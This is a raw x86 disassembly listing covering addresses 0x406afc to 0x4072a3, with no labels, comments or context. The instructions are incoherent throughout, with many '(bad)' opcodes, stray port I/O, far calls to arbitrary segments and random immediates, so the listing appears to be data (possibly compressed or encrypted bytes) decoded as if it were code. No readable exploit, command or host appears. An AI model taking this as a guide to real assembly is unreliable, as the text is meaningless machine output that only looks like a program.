  406afc:	fiadd  WORD PTR [ebp-0x5ded3812]
  406b02:	xchg   esp,eax
  406b03:	in     al,0x7a
  406b05:	int3   
  406b06:	sahf   
  406b07:	stos   DWORD PTR es:[edi],eax
  406b08:	popa   
  406b09:	popa   
  406b0a:	sub    BYTE PTR [ecx+0x55b55179],bh
  406b10:	inc    ecx
  406b11:	dec    ebp
  406b12:	or     edi,DWORD PTR [ecx]
  406b14:	jbe    0x406b42
  406b16:	sti    
  406b17:	(bad)  
  406b18:	mov    esp,0xa8953946
  406b1d:	test   DWORD PTR [eax+0x72b40ba9],ebp
  406b23:	push   eax
  406b24:	fadd   QWORD PTR [edi-0xd]
  406b27:	jmp    FWORD PTR [ebx-0xd]
  406b2a:	pop    edi
  406b2b:	imul   edx,DWORD PTR [ebp+0x62],0xffffffce
  406b2f:	sub    eax,0x1a7cd64a
  406b34:	jbe    0x406bb4
  406b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b37:	cli    
  406b38:	push   edi
  406b39:	xor    ecx,DWORD PTR ss:[ebx+esi*1-0x2e]
  406b3e:	cli    
  406b3f:	movntps XMMWORD PTR [ecx],xmm1
  406b42:	fldcw  WORD PTR [edi+0x63]
  406b45:	jns    0x406b14
  406b47:	or     eax,0xdfffef06
  406b4c:	(bad)
  406b50:	int3   
  406b51:	lock out dx,al
  406b53:	mov    dh,0xe4
  406b55:	mov    DWORD PTR [edi+0x45],ecx
  406b58:	dec    ecx
  406b59:	pop    ebp
  406b5a:	pop    DWORD PTR [ebp+0x55]
  406b5d:	daa    
  406b5e:	nop
  406b5f:	hlt    
  406b60:	into   
  406b61:	inc    ebx
  406b62:	xor    al,0xf5
  406b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b65:	jbe    0x406b28
  406b67:	mov    esp,ecx
  406b69:	jno    0x406b73
  406b6b:	adc    ah,BYTE PTR [ebx+0x14]
  406b6e:	xchg   ebx,eax
  406b6f:	cmp    al,0x71
  406b71:	stos   DWORD PTR es:[edi],eax
  406b72:	and    esp,esi
  406b74:	xlat   BYTE PTR cs:[ebx]
  406b76:	mov    ebp,0x894dfc66
  406b7b:	aaa    
  406b7c:	in     eax,0xc4
  406b7e:	jge    0x406b4c
  406b80:	push   ebp
  406b81:	sbb    bl,al
  406b83:	or     ebp,DWORD PTR [eax]
  406b85:	sahf   
  406b86:	push   ecx
  406b87:	sub    BYTE PTR [esi-0x67],bl
  406b8a:	call   0xb98f:0xa2f2ce15
  406b91:	bound  edx,QWORD PTR [ecx-0x7b5e9499]
  406b97:	pop    eax
  406b98:	sar    DWORD PTR [ebx-0x3e],cl
  406b9b:	outs   dx,DWORD PTR ds:[esi]
  406b9c:	inc    esi
  406b9d:	sbb    eax,0x59e43a58
  406ba2:	lea    esi,[eax]
  406ba4:	sub    DWORD PTR [ebx+0x46],edx
  406ba7:	xlat   BYTE PTR ds:[ebx]
  406ba8:	pop    ebx
  406ba9:	inc    edi
  406baa:	xchg   esp,eax
  406bab:	push   DWORD PTR [edi+ebp*4+0x61]
  406baf:	aam    0xc2
  406bb1:	and    edi,DWORD PTR [edi]
  406bb3:	cwde   
  406bb4:	gs aaa 
  406bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bb7:	adc    BYTE PTR [edx-0x5d],0x90
  406bbb:	bound  ebp,QWORD PTR [ebp-0x1b]
  406bbe:	or     dh,dh
  406bc0:	dec    edx
  406bc1:	pop    es
  406bc2:	mov    ds:0x3b3df3fe,eax
  406bc7:	pop    esi
  406bc8:	jge    0x406b8a
  406bca:	popf   
  406bcb:	fcom   QWORD PTR [eax-0x7e94835e]
  406bd1:	push   ebp
  406bd3:	leave  
  406bd4:	xchg   ecx,eax
  406bd6:	(bad)  [ecx+ebp*2+0x78d1f803]
  406bdd:	mov    bh,0x1b
  406bdf:	and    DWORD PTR ds:0xfb4ba665,esi
  406be5:	arpl   WORD PTR [eax-0x18],bx
  406be8:	(bad)  
  406be9:	cwde   
  406bea:	mov    BYTE PTR [ebx],dh
  406bec:	scas   al,BYTE PTR es:[edi]
  406bed:	jb     0x406c40
  406bef:	adc    eax,0x5caecfef
  406bf4:	lods   eax,DWORD PTR ds:[esi]
  406bf5:	jle    0x406bfa
  406bf7:	js     0x406c2f
  406bf9:	in     al,dx
  406bfa:	push   esp
  406bfb:	inc    ecx
  406bfc:	fsubr  QWORD PTR [ecx-0x45]
  406bff:	mov    eax,ds:0x86b0ef9e
  406c04:	fucomp st(7)
  406c06:	pop    esi
  406c07:	xor    al,0xcb
  406c09:	jb     0x406c52
  406c0b:	hlt    
  406c0c:	mov    ah,0x3
  406c0e:	ds jmp 0x406c40
  406c11:	add    BYTE PTR [edx-0x23],bl
  406c14:	in     al,0x86
  406c16:	call   0x9ad552cb
  406c1b:	call   0x282a:0xad95fdbc
  406c22:	add    esp,edx
  406c24:	mov    edx,0x1f2e4294
  406c29:	adc    cl,cl
  406c2b:	sahf   
  406c2c:	ror    BYTE PTR [ecx-0x28],cl
  406c2f:	ins    BYTE PTR es:[edi],dx
  406c30:	mov    al,0xdd
  406c32:	inc    edx
  406c33:	jge    0x406c6f
  406c35:	test   eax,0x50e2eb02
  406c3a:	jle    0x406bdd
  406c3c:	pusha  
  406c3d:	iret   
  406c3e:	int3   
  406c3f:	xchg   edi,eax
  406c40:	or     eax,0x5c77019
  406c45:	jle    0x406c14
  406c47:	mov    BYTE PTR [ecx],0x55
  406c4a:	aad    0x8a
  406c4c:	sbb    eax,0x95926e09
  406c51:	dec    eax
  406c52:	fucomip st,st(0)
  406c54:	ret    0x1dab
  406c57:	jl     0x406c62
  406c59:	and    eax,0x441890bb
  406c5e:	mov    ch,0x2
  406c60:	add    al,0x3c
  406c62:	bound  edx,QWORD PTR [esi-0x3]
  406c65:	jp     0x406c2d
  406c67:	mov    ds:0xbce2f14,eax
  406c6c:	inc    ebx
  406c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c6e:	xor    cl,BYTE PTR [edi-0x57]
  406c71:	or     DWORD PTR [edi-0x58bcf695],0xffffffa9
  406c78:	retf   
  406c79:	stos   BYTE PTR es:[edi],al
  406c7a:	in     eax,dx
  406c7b:	fstp   st(3)
  406c7d:	xchg   ecx,eax
  406c7e:	mov    bl,0xc3
  406c80:	test   eax,0xe8667c97
  406c85:	adc    eax,0x544126cb
  406c8a:	adc    ch,BYTE PTR [esi+0x61]
  406c8d:	(bad)  
  406c8e:	cdq    
  406c8f:	or     eax,0x4f690ff
  406c94:	sahf   
  406c95:	lahf   
  406c96:	push   edx
  406c97:	sar    BYTE PTR [edx+0x4653594b],cl
  406c9d:	int3   
  406c9e:	cwde   
  406c9f:	pop    es
  406ca0:	mov    dl,al
  406ca2:	iret   
  406ca3:	lds    eax,FWORD PTR [ebx+0x2cb15ca8]
  406ca9:	mov    ds:0x3a74266d,eax
  406cae:	loope  0x406d17
  406cb0:	in     al,dx
  406cb1:	(bad)  
  406cb2:	lods   al,BYTE PTR ds:[esi]
  406cb3:	out    dx,eax
  406cb4:	xor    al,0x6e
  406cb6:	outs   dx,BYTE PTR ds:[esi]
  406cb7:	xor    BYTE PTR [esi+0x2c],0xcc
  406cbb:	scas   al,BYTE PTR es:[edi]
  406cbc:	xor    BYTE PTR [eax+0x687be5e4],cl
  406cc2:	popf   
  406cc3:	stos   DWORD PTR es:[edi],eax
  406cc4:	mov    ds:0xf08b0b9a,eax
  406cc9:	sbb    dh,al
  406ccb:	test   eax,0xadf5d914
  406cd0:	jne    0x406cf1
  406cd2:	addr16 out dx,al
  406cd4:	je     0x406ca0
  406cd6:	ins    BYTE PTR es:[edi],dx
  406cd7:	inc    edx
  406cd8:	jne    0x406d0d
  406cda:	(bad)  
  406cdb:	sbb    al,0x25
  406cdd:	sbb    al,0x41
  406cdf:	cmp    al,0x3c
  406ce1:	sbb    DWORD PTR [edi+0x5a2804b7],eax
  406ce7:	pop    ecx
  406ce8:	rcr    BYTE PTR [ebp+0x55640ab1],1
  406cee:	call   0x534e:0x60acf41a
  406cf5:	add    BYTE PTR [edi+0xb8a372a],al
  406cfb:	adc    cl,bl
  406cfd:	mov    dh,0x6b
  406cff:	adc    DWORD PTR [ecx+0x37],ebx
  406d02:	fld    DWORD PTR es:[edi+0x69]
  406d06:	loopne 0x406d6b
  406d08:	test   DWORD PTR [eax+0x55844616],esi
  406d0e:	(bad)  
  406d0f:	addr16 pop ecx
  406d11:	std    
  406d12:	cmp    esp,eax
  406d14:	and    DWORD PTR [edx+0x4c],ebp
  406d17:	test   eax,0xf6ef92dc
  406d1c:	lods   eax,DWORD PTR ds:[esi]
  406d1d:	pushf  
  406d1e:	mov    eax,0xcb21c812
  406d23:	cmc    
  406d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d25:	iret   
  406d26:	push   ds
  406d27:	cmp    edi,DWORD PTR [edx+0x571c6d3]
  406d2d:	out    0xc0,eax
  406d2f:	(bad)  
  406d30:	and    eax,0x4e69af0d
  406d35:	js     0x406d6f
  406d37:	jae    0x406d91
  406d39:	repz xchg edi,eax
  406d3b:	mov    al,0xc3
  406d3d:	mov    bl,BYTE PTR [ebx+0x26b57e98]
  406d43:	or     eax,0x75791d84
  406d48:	jmp    0x406d1d
  406d4a:	mov    BYTE PTR [edi],ah
  406d4c:	dec    ebp
  406d4d:	push   cs
  406d4e:	mov    al,0xb3
  406d50:	pop    ebx
  406d51:	icebp  
  406d52:	mov    esp,0x9a73b5a4
  406d57:	xor    DWORD PTR [ecx+ebx*2-0x1b240537],ebx
  406d5e:	jo     0x406ce0
  406d60:	mov    WORD PTR [eax-0x380b5433],fs
  406d66:	push   ebp
  406d67:	push   esi
  406d68:	sub    eax,0x9e601c0b
  406d6d:	test   eax,0x64b1d521
  406d72:	shr    BYTE PTR [ebp-0x5f52dc9c],cl
  406d78:	sub    al,0x1b
  406d7a:	xchg   edx,eax
  406d7b:	add    ch,BYTE PTR [ebx-0x5996a50e]
  406d81:	dec    esp
  406d82:	repnz outs dx,DWORD PTR ds:[esi]
  406d84:	lds    ebx,FWORD PTR [edi]
  406d86:	das    
  406d87:	lahf   
  406d88:	cmc    
  406d89:	or     DWORD PTR [ecx+0x4],edi
  406d8c:	dec    edx
  406d8d:	test   edi,ebx
  406d8f:	xchg   ecx,eax
  406d90:	inc    ecx
  406d91:	jno    0x406e10
  406d93:	int3   
  406d94:	mov    DWORD PTR [esi-0x7ea133d9],ebp
  406d9a:	(bad)  
  406d9b:	mov    eax,ds:0x9471a608
  406da0:	push   eax
  406da1:	(bad)  
  406da2:	es ja  0x406d8d
  406da5:	stc    
  406da6:	cdq    
  406da7:	add    BYTE PTR [edx],0xef
  406daa:	aam    0xf4
  406dac:	mov    ch,0xa3
  406dae:	popf   
  406daf:	outs   dx,BYTE PTR ds:[esi]
  406db0:	inc    esi
  406db2:	mov    esi,0xb7bae786
  406db7:	aas    
  406db8:	pop    ebx
  406db9:	push   ebx
  406dba:	out    dx,eax
  406dbb:	(bad)  
  406dbc:	aas    
  406dbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dbe:	inc    ecx
  406dbf:	xchg   ebp,eax
  406dc0:	in     ax,dx
  406dc2:	xchg   ecx,eax
  406dc3:	adc    BYTE PTR es:[ebp+0x33],al
  406dc7:	popa   
  406dc8:	sbb    bh,al
  406dca:	mov    BYTE PTR [ebx],dh
  406dcc:	sbb    BYTE PTR [ebp+0x487b598d],ah
  406dd2:	shr    ebp,cl
  406dd4:	out    dx,eax
  406dd5:	xor    esp,ebp
  406dd7:	and    al,0xf0
  406dd9:	jo     0x406da0
  406ddb:	scas   al,BYTE PTR es:[edi]
  406ddc:	inc    ecx
  406ddd:	(bad)  
  406dde:	lock sub eax,0xb41b1c09
  406de4:	push   esi
  406de5:	jbe    0x406d8e
  406de7:	ins    BYTE PTR es:[edi],dx
  406de8:	mov    dh,0x4e
  406dea:	ja     0x406d9c
  406dec:	sahf   
  406ded:	out    0xf5,eax
  406def:	in     eax,dx
  406df0:	out    0x9,al
  406df2:	fisub  DWORD PTR [edi-0x6d]
  406df5:	in     eax,dx
  406df6:	pop    edi
  406df7:	(bad)  
  406df8:	fldl2t 
  406dfa:	adc    ah,BYTE PTR ds:0x89f7be19
  406e00:	fs pop ebp
  406e02:	pop    ecx
  406e03:	dec    esi
  406e04:	(bad)  
  406e05:	lds    ebp,FWORD PTR [edi]
  406e07:	repz add DWORD PTR fs:[eax],ebp
  406e0b:	adc    bl,al
  406e0d:	outs   dx,BYTE PTR ds:[esi]
  406e0e:	add    ecx,DWORD PTR [eax+ecx*1+0x3b]
  406e12:	xor    ecx,DWORD PTR [eax]
  406e14:	cmp    bl,BYTE PTR [ebx]
  406e16:	shl    BYTE PTR [ebx+0x563d2a99],0x18
  406e1d:	jbe    0x406deb
  406e1f:	addr16 daa 
  406e21:	rcl    BYTE PTR [edx+0x38],cl
  406e24:	shl    DWORD PTR [esi],1
  406e26:	and    ecx,0x2
  406e29:	inc    ebp
  406e2a:	sub    al,0x5f
  406e2c:	and    eax,0x4c796a72
  406e31:	add    eax,DWORD PTR [ecx-0x4859265f]
  406e37:	or     esi,DWORD PTR [edi-0x75]
  406e3a:	arpl   WORD PTR [ecx+0x735a8364],di
  406e40:	push   ebx
  406e41:	sub    DWORD PTR [esi-0x3c],0x54
  406e45:	fistp  QWORD PTR [edi+0x78]
  406e48:	and    bh,BYTE PTR [ebx]
  406e4a:	stc    
  406e4b:	add    DWORD PTR [eax+0x2ce8c83a],0xffffff84
  406e52:	idiv   DWORD PTR [eax+0x7296f46a]
  406e58:	imul   edi,DWORD PTR ds:0x9867e98e,0xffffffcb
  406e5f:	cmp    al,0xc3
  406e61:	fsubp  st(6),st
  406e63:	idiv   DWORD PTR [edx+ebp*2]
  406e66:	gs jo  0x406eb6
  406e69:	or     DWORD PTR [edi*8+0x52f17cd4],ebx
  406e70:	ins    BYTE PTR es:[edi],dx
  406e71:	dec    ecx
  406e72:	ret    0x6489
  406e75:	lahf   
  406e76:	sub    DWORD PTR [eax+eiz*4-0x7dfdcec],edx
  406e7d:	push   cs
  406e7e:	pop    edi
  406e7f:	jno    0x406eb6
  406e81:	rol    DWORD PTR [eiz*1-0x3d46c583],1
  406e88:	and    eax,0x2cf7cc9a
  406e8d:	xchg   esp,eax
  406e8e:	jb     0x406ed9
  406e90:	mov    ecx,0xd642f20e
  406e95:	mov    es,WORD PTR [edx]
  406e97:	xchg   edx,eax
  406e98:	inc    eax
  406e99:	xor    DWORD PTR ds:0x86e725bf,ebx
  406e9f:	call   0x2139a4b7
  406ea4:	hlt    
  406ea5:	dec    ecx
  406ea6:	sub    DWORD PTR [edi-0x1c25e5a9],esp
  406eac:	and    al,0x8b
  406eae:	scas   eax,DWORD PTR es:[edi]
  406eaf:	pusha  
  406eb0:	jne    0x406eee
  406eb2:	sub    bh,BYTE PTR [esi-0x4]
  406eb5:	lock push ebp
  406eb7:	inc    esp
  406eb8:	inc    edx
  406eb9:	push   0x72
  406ebb:	jp     0x406ecd
  406ebd:	xor    cl,0x1d
  406ec0:	jno    0x406e91
  406ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec3:	mov    dl,0xea
  406ec5:	iret   
  406ec6:	xor    BYTE PTR [eax+0x5f],ah
  406ec9:	lahf   
  406eca:	jle    0x406f16
  406ecc:	icebp  
  406ecd:	dec    ebx
  406ece:	stos   DWORD PTR es:[edi],eax
  406ecf:	call   0xc81c:0x56ae0d75
  406ed6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ed8:	or     BYTE PTR [esi+0xb6ac3e1],dl
  406ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406edf:	stos   DWORD PTR es:[edi],eax
  406ee0:	push   esp
  406ee1:	outs   dx,BYTE PTR ds:[esi]
  406ee2:	add    eax,0xa8d203a9
  406ee7:	cmp    cl,BYTE PTR [esi+0x68]
  406eea:	das    
  406eeb:	cmp    edx,esi
  406eed:	xchg   ebx,eax
  406eee:	sub    eax,0x93674480
  406ef3:	push   esi
  406ef4:	aas    
  406ef5:	int3   
  406ef6:	dec    edx
  406ef7:	add    DWORD PTR [ebx-0x3c87a5ac],edi
  406efd:	push   cs
  406efe:	mov    edx,0xd6977f50
  406f03:	out    0x9b,eax
  406f05:	cs test eax,0x5ca4616c
  406f0b:	rol    DWORD PTR [ecx+0x22],cl
  406f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f0f:	daa    
  406f10:	loopne 0x406f01
  406f12:	push   edx
  406f13:	(bad)  
  406f14:	mov    ds:0x74767b65,eax
  406f19:	xchg   ebx,eax
  406f1a:	sbb    BYTE PTR [edi+0x6c53538d],bl
  406f20:	out    0xd8,eax
  406f22:	adc    bl,BYTE PTR [eax+0x355837fb]
  406f28:	lods   eax,DWORD PTR ds:[esi]
  406f29:	jns    0x406f3c
  406f2b:	jp     0x406f84
  406f2d:	mov    ds:0x9dc1888,al
  406f32:	xor    ecx,esp
  406f34:	sbb    al,0x8a
  406f36:	test   al,0x90
  406f38:	cmp    DWORD PTR [ebx+0x6d1d883b],esi
  406f3e:	cmp    BYTE PTR [ecx+0x4b9bb6b6],0xce
  406f45:	sub    al,0x9f
  406f47:	dec    ecx
  406f48:	fdiv   st,st(0)
  406f4a:	iret   
  406f4b:	rcl    BYTE PTR [ebx+0x75efa738],0x46
  406f52:	aad    0xd3
  406f54:	icebp  
  406f55:	jne    0x406f4e
  406f57:	xchg   esi,eax
  406f58:	pop    edx
  406f59:	mov    dh,0x99
  406f5b:	inc    DWORD PTR [ebp-0x3693a7f6]
  406f61:	stos   BYTE PTR es:[edi],al
  406f62:	inc    ecx
  406f63:	mov    ah,0x88
  406f65:	in     eax,0x8c
  406f67:	test   BYTE PTR ds:0x30ba5760,bl
  406f6d:	sub    DWORD PTR [edx+ebp*8+0x6d1b89af],ebp
  406f74:	push   esp
  406f75:	loop   0x406f7b
  406f77:	dec    eax
  406f78:	fstp   DWORD PTR [edx+eiz*8-0x6e]
  406f7c:	mov    eax,ds:0x5487aa59
  406f81:	pop    eax
  406f82:	ds and esp,eax
  406f85:	fisttp WORD PTR [ebx]
  406f87:	mov    DWORD PTR [esi-0x9],0x97f55e1b
  406f8e:	jge    0x406fd9
  406f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f91:	mov    bl,BYTE PTR [eax-0x65]
  406f94:	loop   0x406f6e
  406f96:	adc    DWORD PTR [ebx+0x6d749f49],esp
  406f9c:	cs into 
  406f9e:	ds mov ecx,0xb6f23a02
  406fa4:	xlat   BYTE PTR ds:[ebx]
  406fa5:	jg     0x406f90
  406fa7:	pusha  
  406fa8:	or     DWORD PTR [edx],edi
  406faa:	jmp    0x49dae7c1
  406faf:	fcomp  QWORD PTR [ebp+0x3866b13c]
  406fb5:	xchg   ebx,eax
  406fb6:	mov    dl,0x7c
  406fb8:	or     DWORD PTR [edi],edi
  406fba:	imul   edi,DWORD PTR [ecx+eax*4+0x6d3fef61],0x59
  406fc2:	leave  
  406fc3:	sbb    al,0xee
  406fc5:	sub    BYTE PTR [edi+0x25385d50],cl
  406fcb:	lock int3 
  406fcd:	add    eax,0x982e6790
  406fd2:	jae    0x406f5a
  406fd4:	out    0x2d,al
  406fd6:	jbe    0x406fdc
  406fd8:	call   0xb2f04f25
  406fdd:	xchg   ecx,eax
  406fde:	sub    BYTE PTR [esi+0x49],cl
  406fe1:	jno    0x406fc7
  406fe3:	mov    ebx,0x77e6085f
  406fe8:	dec    esp
  406fe9:	repz mov esi,0x84f41919
  406fef:	out    dx,eax
  406ff0:	adc    bl,BYTE PTR [edx+0x7f1fa1d2]
  406ff6:	sub    BYTE PTR [ebx],bl
  406ff8:	mov    al,ds:0xdb2feafa
  406ffd:	sahf   
  406ffe:	push   esi
  406fff:	cmp    ah,bl
  407001:	sahf   
  407002:	inc    esi
  407003:	xchg   esp,eax
  407004:	dec    ecx
  407005:	mov    ah,BYTE PTR [ebp+0x34e2429d]
  40700b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40700c:	fucomi st,st(7)
  40700e:	dec    esp
  40700f:	mov    eax,DWORD PTR [esi-0x2337251f]
  407015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407017:	das    
  407018:	inc    ebp
  407019:	(bad)  
  40701a:	sti    
  40701b:	xor    al,0x20
  40701d:	dec    eax
  40701e:	fldcw  WORD PTR fs:[edx-0x36]
  407022:	sbb    cl,BYTE PTR [esi]
  407024:	aas    
  407025:	test   esi,esi
  407027:	jmp    0x5a332040
  40702c:	add    ch,BYTE PTR [ebx-0x1ec3aeeb]
  407032:	pop    edi
  407033:	adc    DWORD PTR [ecx],edi
  407035:	inc    esp
  407036:	sub    BYTE PTR [ebx],0x84
  407039:	mov    esi,DWORD PTR [ecx]
  40703b:	mov    bl,0xef
  40703d:	sbb    al,0xfc
  40703f:	mov    ds:0xdfe0e40e,eax
  407044:	dec    ebx
  407045:	loope  0x407026
  407047:	scas   al,BYTE PTR es:[edi]
  407048:	jne    0x406fd0
  40704a:	mov    bl,0xe
  40704c:	mov    ecx,0x69ed23ea
  407051:	pop    ds
  407052:	xor    BYTE PTR [edi],dl
  407054:	shl    DWORD PTR [ecx-0x67a10e15],0x3b
  40705b:	dec    eax
  40705c:	and    eax,esi
  40705e:	dec    ecx
  40705f:	add    ecx,DWORD PTR [edx-0x429d36f8]
  407065:	bound  esi,QWORD PTR [esi-0x262f487]
  40706b:	pop    eax
  40706c:	jbe    0x4070a7
  40706e:	lods   eax,DWORD PTR ds:[esi]
  40706f:	jb     0x407005
  407071:	xchg   esp,eax
  407072:	xlat   BYTE PTR ds:[ebx]
  407073:	jmp    0x407090
  407075:	(bad)  
  407077:	push   0x3aa10d69
  40707c:	repz cmp eax,0x13751adb
  407082:	mov    ebp,0x2bfedee7
  407087:	xchg   ecx,eax
  407088:	sbb    dl,BYTE PTR [esi+0x7b]
  40708b:	dec    esi
  40708c:	aad    0x49
  40708e:	fst    DWORD PTR [esi+ecx*4-0x357339f1]
  407095:	vdivps ymm1,ymm5,YMMWORD PTR [ebp-0x48]
  40709a:	gs addr16 jae 0x407096
  40709e:	fsubrp st(7),st
  4070a0:	pop    es
  4070a1:	das    
  4070a2:	std    
  4070a3:	ret    
  4070a4:	fld    TBYTE PTR [ebx+0x1fbfb235]
  4070aa:	sub    dh,BYTE PTR [ebx]
  4070ac:	leave  
  4070ad:	das    
  4070ae:	rcl    DWORD PTR [ebp+0x0],cl
  4070b1:	cmc    
  4070b2:	(bad)  
  4070b3:	outs   dx,DWORD PTR ds:[esi]
  4070b4:	call   0xc71dbd79
  4070b9:	pop    edx
  4070ba:	in     eax,0x21
  4070bc:	cdq    
  4070bd:	in     al,0x99
  4070bf:	cmp    DWORD PTR [esi+0x6bf5779e],0x46
  4070c6:	mov    ch,0x5f
  4070c8:	sbb    al,0xfc
  4070ca:	repz mov al,0x20
  4070cd:	xchg   edx,eax
  4070ce:	mov    ah,0xcc
  4070d0:	pushf  
  4070d1:	ja     0x407069
  4070d3:	sbb    ebp,DWORD PTR [eax-0x53]
  4070d6:	sbb    ch,BYTE PTR [ecx+0x5b]
  4070d9:	adc    edx,ebp
  4070db:	jge    0x407147
  4070dd:	jle    0x4070e3
  4070df:	imul   esi,DWORD PTR [esi],0xbb3bc81b
  4070e5:	imul   edi,edx,0x3f
  4070e8:	xchg   ebp,edx
  4070ea:	bound  esi,QWORD PTR [ebx]
  4070ec:	sbb    BYTE PTR [edx],bh
  4070ee:	iret   
  4070ef:	push   es
  4070f0:	jmp    0xce6e:0xc69b040c
  4070f7:	cdq    
  4070f8:	retf   0xb5db
  4070fb:	dec    esp
  4070fc:	adc    al,BYTE PTR ds:0xe8866805
  407102:	repnz pop ecx
  407104:	jbe    0x4070f4
  407106:	leave  
  407107:	mov    eax,DWORD PTR es:[esi-0x2b]
  40710b:	out    dx,al
  40710c:	sbb    ah,al
  40710e:	neg    DWORD PTR [edi+0x4f3df12e]
  407114:	mov    ebp,0x3af5cb3a
  407119:	sahf   
  40711a:	push   edx
  40711b:	test   DWORD PTR [esi+0x59eac56d],esp
  407121:	fsub   QWORD PTR [ebx]
  407123:	cld    
  407124:	dec    esi
  407125:	mov    ds:0x3e1d40ce,eax
  40712a:	loope  0x4070c7
  40712c:	mov    ebx,0xfc49b008
  407131:	rol    BYTE PTR [edx+0x74],cl
  407134:	stos   BYTE PTR es:[edi],al
  407135:	ins    BYTE PTR es:[edi],dx
  407136:	js     0x4070f3
  407138:	lahf   
  407139:	and    ecx,edx
  40713b:	push   eax
  40713c:	fnsave [ecx-0x1344b05b]
  407142:	jecxz  0x407168
  407144:	ret    
  407145:	jne    0x4070d0
  407147:	inc    edx
  407148:	jno    0x4071b1
  40714a:	cmp    BYTE PTR [esi-0x314a91e6],bh
  407150:	cmp    ah,BYTE PTR [edx+0x2c838b4f]
  407156:	adc    al,0x46
  407158:	inc    esi
  407159:	(bad)  
  40715a:	adc    eax,0x759c7faa
  40715f:	dec    edi
  407160:	push   ecx
  407161:	pop    es
  407162:	sahf   
  407163:	mov    bl,0x59
  407165:	mov    WORD PTR [eax+0x31],cs
  407168:	mov    ecx,DWORD PTR [ebp+0x19]
  40716b:	in     al,0x1
  40716d:	test   eax,0x1784ed21
  407172:	pusha  
  407173:	push   ss
  407174:	jmp    0x40711b
  407176:	cmp    eax,0xe04c9990
  40717b:	shr    ebp,1
  40717d:	(bad)  
  40717e:	ficom  DWORD PTR [esi+0x4c9d057e]
  407184:	dec    esi
  407185:	test   eax,0xff747328
  40718a:	add    edx,0x42a77da1
  407190:	icebp  
  407191:	jb     0x40720c
  407193:	mov    dh,0xe
  407195:	jge    0x407165
  407197:	pop    ecx
  407198:	xor    al,BYTE PTR [edx+0x3206057c]
  40719e:	jl     0x407174
  4071a0:	adc    bl,al
  4071a2:	dec    edx
  4071a3:	es icebp 
  4071a5:	push   ss
  4071a6:	push   eax
  4071a7:	push   edi
  4071a8:	(bad)  
  4071aa:	inc    ecx
  4071ab:	shl    DWORD PTR [ebp-0x2f856e4e],cl
  4071b1:	push   ss
  4071b2:	mov    edi,0x856cfc68
  4071b7:	in     eax,0xdb
  4071b9:	les    edi,FWORD PTR [edx-0x4a5d7564]
  4071bf:	mul    DWORD PTR [ecx+0x46e59c96]
  4071c5:	dec    esi
  4071c6:	xor    eax,0x4d991544
  4071cb:	sub    bh,BYTE PTR [ecx+0x5d]
  4071ce:	push   edx
  4071cf:	xchg   esp,eax
  4071d0:	repnz mov dh,0x6d
  4071d3:	dec    ecx
  4071d4:	data16 (bad) 
  4071d6:	jmp    0x373c:0xfc869e6c
  4071dd:	push   ss
  4071de:	adc    dh,BYTE PTR [edx+eiz*1+0x4eba0fd6]
  4071e5:	adc    al,0x23
  4071e7:	out    dx,al
  4071e8:	jle    0x4071ba
  4071ea:	ins    DWORD PTR es:[edi],dx
  4071eb:	inc    edi
  4071ec:	jp     0x407176
  4071ee:	xor    eax,0x5f841e55
  4071f3:	xor    dl,BYTE PTR [edx+0x51]
  4071f6:	and    ah,BYTE PTR [edi+ebp*2-0x5c]
  4071fa:	test   dl,0x69
  4071fd:	sub    eax,0x6cb98cd5
  407202:	dec    si
  407204:	cmp    eax,0x62d3b5d9
  407209:	and    bh,BYTE PTR [eax+esi*4+0x2f]
  40720d:	adc    eax,0x3fdbf085
  407212:	and    al,0x9c
  407214:	in     eax,dx
  407215:	mov    edi,0xf06b1e5f
  40721a:	lahf   
  40721b:	hlt    
  40721c:	test   BYTE PTR [edx],ah
  40721e:	sbb    al,0xe2
  407220:	cmp    BYTE PTR [esi],0xe6
  407223:	xor    eax,0x978c17ae
  407228:	xchg   edi,eax
  407229:	push   0xffffffdb
  40722b:	and    edi,ebp
  40722d:	sbb    BYTE PTR [esi-0x15bc19c7],dh
  407233:	sbb    cl,BYTE PTR [edx+ebp*2+0x3e]
  407237:	repz lds esp,FWORD PTR [edi+0x10]
  40723b:	mov    WORD PTR [edi],fs
  40723d:	sbb    eax,ebx
  40723f:	cmp    eax,0x3f93b5c8
  407244:	push   0xa7ee6552
  407249:	dec    esp
  40724a:	jle    0x40722f
  40724c:	lods   al,BYTE PTR ds:[esi]
  40724d:	lock fwait
  40724f:	outs   dx,DWORD PTR ds:[esi]
  407250:	and    BYTE PTR [edi-0x69f6bd75],bl
  407256:	add    bl,BYTE PTR [eax-0x6c]
  407259:	sar    DWORD PTR [esi],0xdc
  40725c:	icebp  
  40725d:	jle    0x407257
  40725f:	jmp    eax
  407261:	daa    
  407262:	push   esi
  407263:	in     eax,dx
  407264:	jns    0x4071fc
  407266:	xor    esp,DWORD PTR [edx+0x14]
  407269:	in     al,0xca
  40726b:	add    edx,edi
  40726d:	jecxz  0x4072ed
  40726f:	mov    DWORD PTR [ebp+0x4b],ebp
  407272:	dec    edi
  407273:	paddusw mm7,QWORD PTR [edi]
  407276:	cmc    
  407277:	adc    BYTE PTR [ecx],bh
  407279:	xchg   edx,eax
  40727a:	mov    esp,DWORD PTR ds:0xde731440
  407280:	inc    esp
  407281:	fcmovne st,st(6)
  407283:	(bad)  
  407284:	jecxz  0x407238
  407286:	test   BYTE PTR [ebx+0xcb9c0b],dl
  40728c:	in     eax,dx
  40728d:	int3   
  40728e:	gs ret 0xa354
  407292:	fimul  DWORD PTR [ecx-0x79]
  407295:	mov    DWORD PTR [ebp+0x3dd22c6f],esp
  40729b:	mov    dl,0xc8
  40729d:	mov    al,0xee
  40729f:	jle    0x407315
  4072a1:	ja     0x407322
  4072a3:	aaa    
